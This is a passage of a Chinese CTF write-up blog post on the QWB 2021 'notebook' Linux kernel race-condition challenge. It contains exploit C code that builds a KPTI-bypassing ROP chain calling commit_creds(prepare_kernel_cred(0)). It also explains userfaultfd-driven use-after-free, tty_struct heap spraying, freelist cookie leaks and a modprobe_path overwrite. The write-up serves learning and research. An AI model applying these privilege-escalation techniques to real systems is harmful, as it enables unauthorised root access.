write(fd,tmp,x);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi = base_add(raw_pop_rdi);</span><br><span class="line">    <span class="type">size_t</span> pop_rdx = base_add(raw_pop_rdx);</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax = base_add(raw_mov_rdi_rax);</span><br><span class="line">    <span class="type">size_t</span> pop_rsi = base_add(raw_pop_rsi);</span><br><span class="line">    prepare_kernel_cred_addr = base_add(raw_prepare_kernel_cred);</span><br><span class="line">    commit_creds_addr = base_add(raw_commit_creds);</span><br><span class="line">    <span class="type">size_t</span> xor_edi_edi = base_add(<span class="number">0xffffffff8105c0e0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里swapgs的时候顺便把KPTI关了</span></span><br><span class="line">    <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode =  base_add(<span class="number">0xffffffff81a0095f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x50</span>];</span><br><span class="line">    <span class="type">char</span>* flag_str = <span class="string">&quot;/flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    rop[i++] = pop_rdi;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred_addr;</span><br><span class="line">    rop[i++] = pop_rdi;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = xor_edi_edi;</span><br><span class="line">    rop[i++] = mov_rdi_rax;  </span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = commit_creds_addr;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_return_to_usermode; </span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;win;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *)(xchg_eax_esp&amp;<span class="number">0xffffffff</span>),rop,<span class="keyword">sizeof</span>(rop));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//debug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vtable addr : %p\n&quot;</span>, fake_vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;regcache_mark_dirty addr : %p\n&quot;</span>, base_add(raw_regcache_mark_dirty));</span><br><span class="line">    <span class="type">char</span> x_buf[<span class="number">10</span>];</span><br><span class="line">    read(<span class="number">0</span>,x_buf, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Triggering&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><p>​	L-team 战队的 <a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/laji_note/1662/">exp</a> 应该是最好理解的:</p>
+<ol>
+<li><p>分配一个 <code>0x3ff</code> 的块，然后调用 <code>noteedit</code> 将这个块变为 <code>0x400</code>，并在 <code>copy_from_user</code> 时触发缺页。（保证在 <code>realloc</code> 操作时不重新分配，保留原来的块即可）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(fd,<span class="number">0</span>,<span class="number">0x20</span>,a);</span><br><span class="line"><span class="comment">//add(fd,0,0,addr);</span></span><br><span class="line">edit(fd,<span class="number">0</span>,<span class="number">0x3ff</span>,a);</span><br><span class="line">edit(fd,<span class="number">0</span>,<span class="number">0x400</span>,addr);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过 <code>userfaultfd</code> 劫持掉 <code>noteedit</code> 中的 <code>copy_from_user</code>。</p>
+</li>
+<li><p>在 <code>uffd_handler</code> 中将这个块 free 掉，之后让陷入 <code>uffd</code> 的线程继续被执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> a[<span class="number">10</span>]=<span class="string">&quot;sad&quot;</span>;</span><br><span class="line">        edit(fd,<span class="number">0</span>,<span class="number">0x600</span>,a);  <span class="comment">// free 掉原来的块</span></span><br><span class="line">        edit(fd,<span class="number">0</span>,<span class="number">0x400</span>,a);  <span class="comment">// 保持原来的 size，为了过 mynote_write 中的 size check</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>在线程继续执行后会执行 <code>noteedit</code> 中的 <code>v5-&gt;note = v7</code>，这个 <code>v7</code> 还是最初分配时候的块。而这个块已经在 <code>uffd_handler</code> 中被 free 了。这就产生了 UAF。</p>
+</li>
+<li><p>之后的过程和 will 的 exp 一样，喷 tty，构造 ROP。</p>
+</li>
+</ol>
+<h4 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h4><p>​	长亭的师傅的 <a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/777744778306.htm">exp</a> 的 UAF 构造和前两种又不一样:</p>
+<ol>
+<li>分配  n 个 <code>0x400</code> 大小的块，然后新建 n 个线程通过 <code>noteedit</code> 把这 n 个块 free 掉，并一直卡死。</li>
+<li>这样在主线程看来，已经有 n 个 UAF 的块了。对这 n 个块进行 <code>noteedit</code> 改小 size 过 check。</li>
+<li>通过 tty_struct 喷射，后面的过程又一模一样了。</li>
+</ol>
+<h4 id="exp4"><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h4><p>​	X1cT34m 的 exp 是这四个里面最简单且最巧妙的。简单在不需要内核 ROP，而是通过 <code>modprobe_path</code> 来提权；巧妙在利用了 slub 的控制字节（freelist 单向链表，类似 fastbin）。</p>
+<ol>
+<li>分配两个 0x60 的块，分别为 chunk1, chunk2。</li>
+<li>通过 gift 读出 chunk1 和 chunk2 的地址。</li>
+<li>free(chunk2) , free(chunk1)，此时 freelist -&gt; chunk1 -&gt; chunk2</li>
+<li>再次分配 chunk1 和 chunk2，通过 gift 确保和上次分配的是同两个块。</li>
+<li>此时读出 chunk1 的前 8 字节，这 8 字节应为 <code>cookie ^ chunk1_addr ^ chunk2_addr</code>（详见 <a target="_blank" rel="noopener" href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/">Kirin</a>）。这样就能泄露出 cookie。</li>
+<li>然后在 <code>mynote_write</code> 中利用 <code>copy_from_user</code> 形成缺页。</li>
+<li>在 <code>uffd_handler</code> 中 free 掉 chunk1。在恢复执行的时候仍然可以向被 free 掉的 chunk1 中写入构造好的内容。此时我们写入 8 字节 <code>cookie ^ chunk1_addr ^ notebook_addr-0x10</code> 即可将 freelist 链改为 freelist -&gt; chunk1 -&gt; notebook_addr - 0x10。（但此时 freelist 链并不合法）</li>
+<li>由于 name 在 bss 上的位置正好在 notebook 的前面，所以可以将 note_addr - 0x10 的地方写为 <code>cookie ^ notebook_addr - 0x10 ^ 0</code>，这样 freelist 链就合法了。</li>
+<li>现在 notebook 可控，就能拿到任意地址读写的权力了。通过 notebook.ko 调用内核函数的地方泄露内核基地址，然后改写 <code>modprobe_path</code> 来提权。</li>
+</ol>
+<h3 id="0x03-坑点"><a href="#0x03-坑点" class="headerlink" title="0x03 坑点"></a>0x03 坑点</h3><h4 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h4><p>​	这个在条件竞争中很好用，如果条件竞争的原因是缺页，那么 userfaultfd 可以保证 100% 的竞争成功率。但是要注意的是，<strong>在 <code>uffd_handler</code> 内，没有办法分配回刚刚放入 freelist 的堆块</strong>，正确的姿势是回到主线程再进行分配或者堆喷。</p>
+<h4 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h4><p>​	这个堆喷技巧挺常用，但是有个坑点是 tty_struct 的 size 并不一定是 0x2e0。正确定位其 size 的做法是在 ida 中解析 vmlinux ，查找字符串 “&amp;tty-&gt;legacy_mutex” 的引用。定位到类似 <code>v2 = (_DWORD *)sub_FFFFFFFF81236300(qword_FFFFFFFF8288F810, 21004480LL, 0x3A8LL);</code> 的函数，最后一个参数就是 tty_struct 的大小。（即使 0x2e0 和 0x3a8 都是 0x400 的 slub）</p>
+<h4 id="ONE-gadget-to-TWO-gadget"><a href="#ONE-gadget-to-TWO-gadget" class="headerlink" title="ONE gadget to TWO gadget"></a>ONE gadget to TWO gadget</h4><p>​	<code>raw_regcache_mark_dirty</code> 函数具有非常好的性质，能够劫持两次程序流而且都能控制第一个参数，不过两次 rdi 的值都是一样的。以及第一次 call 的 gadget 需要保证栈平衡返回。</p>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624903037/blog/Snipaste_2021-06-29_01-42-22_q4rorh.png"></p>
+<pre><code> 在本题的内核版本中有设置 rc4 的 gadget。
+</code></pre>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624906988/blog/Snipaste_2021-06-29_03-02-23_bhuzsy.png"></p>
+<p>​	第二次 call 就可以考虑直接栈迁移进行 ROP 了。由于调用指令是 jmp rax，所以 rax 是确定的，因此需要一个 <code>xchg esp,eax; ret</code> 的 gadget。之后就可以把栈迁移到用户了。</p>
+<p>​	但是注意 KPTI 有个特性是即使关闭了 SMAP 和 SMEP，也只能读写用户空间，不能执行用户空间代码。原因是：</p>
+<blockquote>
+<p>不隔离不意味着完全相同，填充内核态页表项时，KPTI 会给页表项加上_PAGE_NX标志，以阻止执行内核态页表所映射用户地址空间的代码。在 KAISER patch 里把这一步骤叫 毒化（poison）。</p>
+</blockquote>
+<p>​	所以还是只能老老实实找内核 gadget，然后打 ROP。</p>
+<h4 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h4><p>​	这个 gadget 可以直接完成提权，这是长亭师傅的方法，及其简单。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81097E90 ; <span class="type">void</span> __fastcall <span class="title function_">work_for_cpu_fn</span><span class="params">(work_struct *work)</span></span><br><span class="line">.text:FFFFFFFF81097E90 work_for_cpu_fn proc near               ; DATA XREF: .init.data:FFFFFFFF825205D0↓o</span><br><span class="line">.text:FFFFFFFF81097E90 work = rdi                              ; work_struct *</span><br><span class="line">.text:FFFFFFFF81097E90                 call    __fentry__      ; PIC mode</span><br><span class="line">.text:FFFFFFFF81097E95                 push    rbx</span><br><span class="line">.text:FFFFFFFF81097E96                 mov     rbx, work</span><br><span class="line">.text:FFFFFFFF81097E99                 mov     work, [work+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81097E9D work = rbx                              ; work_struct *</span><br><span class="line">.text:FFFFFFFF81097E9D                 mov     rax, [work+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81097EA1                 call    __x86_indirect_thunk_rax ; PIC mode</span><br><span class="line">.text:FFFFFFFF81097EA6                 mov     [work+<span class="number">30</span>h], rax</span><br><span class="line">.text:FFFFFFFF81097EAA                 pop     work</span><br><span class="line">.text:FFFFFFFF81097EAB                 retn</span><br><span class="line">.text:FFFFFFFF81097EAB work_for_cpu_fn endp</span><br></pre></td></tr></table></figure>
+
+<p>​	这个函数完成的功能是  <code>*(size_t *)(rdi + 0x30) = ((size_t (*) (size_t))(rdi + 0x20))(rdi + 0x28)</code> ，所以只需要调用两次这个函数就能完成 <code>commit_creds(prepare_kernel_cred(0))</code> 并且正常返回。</p>
+<h4 id="Freelist-Harden"><a href="#Freelist-Harden" class="headerlink" title="Freelist Harden"></a>Freelist Harden</h4><p>​	编译内核的时候 enable 了 <code>CONFIG_SLAB_FREELIST_HARDENED</code> 选项后就会有 slab_cookie。没有 cookie 的情况下直接像 fastbin 一样就可以任意地址分配。有了 cookie 需要先泄露 cookie，而且还需要布置想要分配位置的值为 <code>cookie ^ self_addr</code>。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>V1me
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/" title="从强网杯 Notebook 看内核条件竞争">http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/RoarCantProgram">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/Y3dramJzZw">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+              <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+              <a href="/tags/race-condition/" rel="tag"><i class="fa fa-tag"></i> race condition</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/12/Data-Oriented-Program/" rel="prev" title="Data riented rogram 论文阅读与个人理解">
+                  <i class="fa fa-angle-left"></i> Data riented rogram 论文阅读与个人理解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/07/06/TCTF-2021-Music-writeup/" rel="next" title="0CTF/TCTF 2021 Music writeup">
+                  0CTF/TCTF 2021 Music writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">V1me</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Roarcannotprogramming" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.js" integrity="sha256-+2+qOqR8CKoHh/AsVR9k2qaDBKWjYNC2nozhYmv5j9k=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
